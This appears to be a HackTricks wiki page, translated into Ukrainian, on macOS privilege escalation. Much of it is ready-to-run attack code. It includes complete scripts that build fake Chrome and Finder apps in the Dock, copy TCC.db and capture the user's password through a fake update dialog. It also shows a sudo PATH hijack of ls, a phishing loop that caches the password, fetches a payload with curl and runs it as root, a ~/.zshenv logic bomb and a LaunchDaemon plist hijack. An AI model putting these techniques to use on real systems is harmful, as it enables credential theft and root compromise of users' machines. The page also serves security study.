# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Якщо ви шукаєте інформацію про TCC privilege escalation, перейдіть сюди:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Зверніть увагу, що **більшість трюків із privilege escalation, які стосуються Linux/Unix, також впливають на** машини **MacOS**. Тож дивіться:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Взаємодія з користувачем

### Sudo Hijacking

Оригінальну [техніку Sudo Hijacking можна знайти в дописі про Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Однак macOS **зберігає** користувацький **`PATH`**, коли він виконує **`sudo`**. Це означає, що ще одним способом здійснити цю атаку буде **перехоплення інших бінарних файлів**, які жертва все одно виконуватиме під час **запуску sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Зверніть увагу, що користувач, який використовує terminal, найімовірніше, матиме **Homebrew installed**. Тому можна викрасти бінарні файли в **`/opt/homebrew/bin`**.

### Dock Impersonation

За допомогою **social engineering** можна, наприклад, **імперсонувати Google Chrome** у Dock і фактично виконати власний скрипт:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Деякі пропозиції:

- Перевірте в Dock, чи є Chrome, і в такому разі **видаліть** цей запис та **додайте** **підроблений** запис **Chrome** на ту саму позицію в масиві Dock.

<details>
<summary>Скрипт для імперсонації Chrome у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Кілька порад:

- Ви **не можете видалити Finder із Dock**, тому, якщо ви збираєтеся додати його в Dock, можна розмістити підроблений Finder прямо поруч зі справжнім. Для цього потрібно **додати запис підробленого Finder на початок масиву Dock**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити; «Finder просить дозволу керувати Finder» не виглядає надто дивно.
- Ще один варіант **підвищити привілеї до root без запиту** пароля та жахливого вікна — змусити Finder справді запитати пароль для виконання привілейованої дії:
- Попросіть Finder скопіювати в **`/etc/pam.d`** новий файл **`sudo`** (у запиті пароля буде вказано, що «Finder хоче скопіювати sudo»)
- Попросіть Finder скопіювати новий **Authorization Plugin** (можна контролювати ім’я файлу, тож у запиті пароля буде вказано, що «Finder хоче скопіювати Finder.bundle»)

<details>
<summary>Скрипт для impersonation Finder у Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Фішинг через запит пароля + повторне використання sudo

Шкідливе ПЗ часто зловживає взаємодією з користувачем, щоб **отримати пароль, придатний для sudo**, і програмно повторно його використати. Типовий процес:

1. Визначити користувача, який увійшов у систему, за допомогою `whoami`.
2. **Повторювати запити пароля**, доки `dscl . -authonly "$user" "$pw"` не поверне успішний результат.
3. Кешувати облікові дані (наприклад, у `/tmp/.pass`) і виконувати привілейовані дії за допомогою `sudo -S` (пароль через stdin).

Приклад мінімального ланцюжка:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Викрадений пароль потім можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та запускати додаткові етапи без взаємодії з користувачем.

## Новіші специфічні для macOS вектори (2023–2025)

### Застарілий `AuthorizationExecuteWithPrivileges` досі придатний для використання

`AuthorizationExecuteWithPrivileges` було позначено як застарілий у версії 10.7, але він **досі працює в Sonoma/Sequoia**. Багато комерційних оновлювачів викликають `/usr/libexec/security_authtrampoline` із недовіреним шляхом. Якщо цільовий бінарний файл доступний користувачу для запису, можна розмістити троян і скористатися легітимним запитом:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Поєднайте з наведеними вище **masquerading tricks**, щоб створити правдоподібне діалогове вікно пароля.


### Тріаж Privileged helper / XPC

Багато сучасних сторонніх macOS privescs використовують однаковий шаблон: **root LaunchDaemon** надає **Mach/XPC service** з **`/Library/PrivilegedHelperTools`**, після чого helper або **не перевіряє клієнта**, або перевіряє його **занадто пізно** (PID race), або надає **root method**, що використовує шлях/скрипт, контрольований користувачем. Саме цей клас вразливостей лежить в основі багатьох нещодавніх багів helper у VPN-клієнтах, game launcher-ах та updater-ах.<sup>[[4]](#references)</sup>

Короткий checklist для тріажу:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Звертайте особливу увагу на helper-и, які:

- продовжують приймати запити **після uninstall**, оскільки job залишився завантаженим у `launchd`
- виконують скрипти або читають конфігурацію з **`/Applications/...`** чи інших шляхів, доступних для запису непривілейованим користувачам
- покладаються на перевірку peer-ів на основі **PID** або **лише bundle-id**, яку можна використати для race condition

Докладніше про помилки авторизації helper-ів дивіться на [цій сторінці](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Успадкування середовища скриптами PackageKit (CVE-2024-27822)

До того, як Apple виправила це в **Sonoma 14.5**, **Ventura 13.6.7** і **Monterey 12.7.5**, інсталяції, ініційовані користувачем через **`Installer.app`** / **`PackageKit.framework`**, могли виконувати **PKG-скрипти від імені root у середовищі поточного користувача**. Це означає, що пакет із **`#!/bin/zsh`** завантажував би **`~/.zshenv`** зловмисника та виконував його від імені **root**, коли жертва встановлювала пакет.<sup>[[3]](#references)</sup>

Це особливо цікаво як **logic bomb**: достатньо отримати foothold в обліковому записі користувача та мати доступний для запису startup-файл shell, після чого чекати, доки користувач запустить будь-який вразливий інсталятор на основі **zsh**. Зазвичай це **не** стосується розгортань через **MDM/Munki**, оскільки вони виконуються в середовищі користувача root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Якщо ви хочете глибше ознайомитися зі специфічним зловживанням installer, також перегляньте [цю сторінку](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Перехоплення LaunchDaemon plist (патерн CVE-2025-24085)

Якщо LaunchDaemon plist або його ціль `ProgramArguments` є **доступними для запису користувачем**, можна підвищити привілеї, замінивши його, а потім змусивши launchd перезавантажити конфігурацію:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Це відтворює шаблон exploit, опублікований для **CVE-2025-24085**, де writable plist використовувався для виконання коду attacker з правами root.

### XNU SMR credential race (CVE-2025-24118)

**race у `kauth_cred_proc_update`** дає локальному attacker змогу пошкодити read-only покажчик облікових даних (`proc_ro.p_ucred)` шляхом виконання циклів `setgid()`/`getgid()` у різних потоках, доки не станеться розірваний `memcpy`. Успішне пошкодження забезпечує **uid 0** і доступ до kernel memory. Мінімальна структура PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
У поєднанні з heap grooming це дає змогу розмістити контрольовані дані там, де вказівник повторно зчитується. У вразливих збірках це надійна **локальна ескалація привілеїв ядра** без необхідності обходу SIP.<sup>[[2]](#references)</sup>

### SIP bypass через Migration assistant ("Migraine", CVE-2023-32369)

Якщо ви вже маєте root, SIP усе одно блокує запис у системні розташування. Вразливість **Migraine** зловживає entitlement Migration Assistant `com.apple.rootless.install.heritable`, щоб створити дочірній процес, який успадковує SIP bypass і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`).<sup>[[1]](#references)</sup> Ланцюжок:

1. Отримати root у запущеній системі.
2. Запустити `systemmigrationd` зі спеціально сформованим станом, щоб виконати бінарний файл, контрольований атакувальником.
3. Використати успадкований entitlement для зміни файлів, захищених SIP, із забезпеченням persistence навіть після перезавантаження.

### NSPredicate/XPC expression smuggling (клас помилок CVE-2023-23530/23531)

Кілька демонів Apple приймають об’єкти **NSPredicate** через XPC і перевіряють лише поле `expressionType`, яким може керувати атакувальник. Створивши predicate, що виконує довільні selectors, можна досягти **виконання коду в root/system XPC-сервісах** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим виходом із sandbox застосунку це забезпечує **ескалацію привілеїв без запитів до користувача**. Шукайте XPC endpoints, які десеріалізують predicates і не мають надійного visitor.

## TCC - Ескалація привілеїв root

### CVE-2020-9771 - mount_apfs TCC bypass та ескалація привілеїв

**Будь-який користувач** (навіть без привілеїв) може створити й змонтувати snapshot Time Machine за допомогою `-o noowners` та **отримати доступ до ВСІХ файлів** цього snapshot, обходячи перевірки власника на активному томі. Єдиний необхідний привілей полягає в тому, що застосунок (наприклад, `Terminal`) має мати **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Команди та повне пояснення наведено на сторінці TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Конфіденційна інформація

Це може бути корисним для ескалації привілеїв:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [SIP bypass Microsoft "Migraine" (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Опис race condition під час запису облікових даних SMR для CVE-2025-24118 і PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: ескалація привілеїв macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: локальна ескалація привілеїв AWS Client VPN для macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
